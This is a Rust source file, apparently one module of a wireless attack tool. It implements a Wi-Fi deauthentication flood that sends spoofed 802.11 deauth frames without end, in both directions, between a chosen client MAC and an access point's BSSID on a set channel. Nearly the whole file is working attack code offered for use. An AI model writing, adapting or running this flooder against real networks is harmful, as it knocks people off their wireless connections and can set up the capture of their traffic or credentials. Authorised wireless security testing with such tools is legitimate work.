use std::{thread, time::Duration};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use crate::engines::DeauthArgs;
use crate::iface::{Iface, IfaceManager};
use crate::builders::Frames;
use crate::sockets::Layer2Socket;
use crate::utils::{CtrlCHandler, abort, Mac, Bssid};




pub struct Deauthentication {
    builder    : Frames,
    frms_sent  : usize,
    seq_num    : u16,
    socket     : Layer2Socket,
    iface      : Iface,
    channel    : i32,
    bssid      : Bssid,
    target_mac : Mac,
    delay      : u64
}


impl Deauthentication {

    pub fn new(args: DeauthArgs) -> Self {
        Self { 
            builder    : Frames::new(),
            frms_sent  : 0,
            seq_num    : 1,
            socket     : Layer2Socket::new(&args.iface),
            iface      : args.iface,
            channel    : args.channel,
            bssid      : args.bssid,
            target_mac : args.target_mac,
            delay      : args.delay,
        }
    }



    pub fn execute(&mut self) {
        self.set_channel();
        self.display_exec_info();
        self.send_endlessly();
    }



    fn set_channel(&self) {
        if !IfaceManager::set_channel(self.iface.name(), self.channel) {
            abort(
                format!(
                    "Uneable to set channel {} on interface {}", 
                    self.iface.name(), self.channel
                )
            )
        }
    }



    fn display_exec_info(&self) {
        println!("[!] BSSID...: {}", self.bssid.to_string());
        println!("[!] TARGET..: {}", self.target_mac.to_string());
        println!("[!] CHANNEL.: {}", self.channel);
    }



    fn send_endlessly(&mut self) {
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());
        
        println!("\n[+] Sending frames. Press CTRL + C to stop");

        while running.load(Ordering::SeqCst) {
            let target = *self.target_mac.bytes();
            let bssid  = *self.bssid.bytes();
        
            self.send_frame(&target, &bssid);
            self.send_frame(&bssid, &target);
        }
    
        println!("\n[-] Flood interrupted");
        println!("[%] Frames sent: {}", self.frms_sent);
    }



    #[inline]
    fn send_frame(
        &mut self, 
        src_mac : &[u8; 6], 
        dst_mac : &[u8; 6], 
    ) {
        let frame = self.builder.deauth(dst_mac, src_mac, self.bssid, self.seq_num);
        
        self.socket.send(frame);
        self.update_seq_num();
        self.frms_sent += 1;

        thread::sleep(Duration::from_millis(self.delay));
    }



    #[inline]
    fn update_seq_num(&mut self) {
        if self.seq_num >= 4095 {
            self.seq_num = 0;
        }

        self.seq_num += 1;
    }

}



impl crate::EngineTrait for Deauthentication {
    type Args = DeauthArgs;
    
    fn new(args: Self::Args) -> Self {
        Deauthentication::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}